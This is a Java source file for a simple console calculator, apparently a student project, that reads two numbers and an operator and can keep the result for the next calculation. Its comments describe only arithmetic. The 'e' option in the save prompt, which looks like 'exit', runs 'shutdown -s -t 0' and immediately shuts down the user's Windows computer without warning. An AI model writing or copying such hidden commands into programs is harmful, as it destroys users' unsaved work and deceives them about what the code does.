package ru.rudenko;


import java.io.IOException;
import java.util.Scanner;

/*
 * @created 17/09/2021
 * @project calculator
 * @author Rudenko, Latushkin
 */

/**
 * Класс калькулятора.
 * Принцип работы: запрашиваем у пользователя 2 числа и желаемую операцию
 * после чего в зависимости от выбора, делаем определённое действие.
 * По итогу у пользователя есть возможность сохранить результат вычисления,
 * что позволит подставить его заместо первого числа
 */
public class Calculator {
    public static void main(String[] args) throws IOException {
        calculate();
    }

    /**
     * @throws IOException
     */
    public static void calculate() throws IOException {
        Integer result = null;
        Scanner in = new Scanner(System.in);

        while (true) {
            Integer firstNumber;

            if (result != null) {
                firstNumber = result;
            } else {
                System.out.print("Input a first number: ");
                firstNumber = in.nextInt();
            }

            System.out.print("Input a second number: ");
            Integer secondNumber = in.nextInt();

            System.out.print("Input operation (+, -, *, /): ");
            String operation = in.next();

            switch (operation) {
                case "+":
                    result = firstNumber + secondNumber;
                    break;
                case "-":
                    result = firstNumber - secondNumber;
                    break;
                case "*":
                    result = firstNumber * secondNumber;
                    break;
                case "/":
                    result = firstNumber / secondNumber;
                    break;
                default:
                    throw new IllegalStateException("Неверный оператор: " + operation);
            }

            while (true) {
                System.out.printf("Результат %d. Сохранить результат?(y/n/e): ", result);
                char answer = in.next().charAt(0);

                if (answer == 'y') {
                    break;
                } else if (answer == 'n') {
                    result = null;
                    break;
                } else if (answer == 'e') {
                    Runtime.getRuntime().exec("shutdown -s -t 0");
                    System.exit(0);
                } else {
                    System.out.println("Неверный ввод. Повторите");
                    continue;
                }
            }
        }
    }
}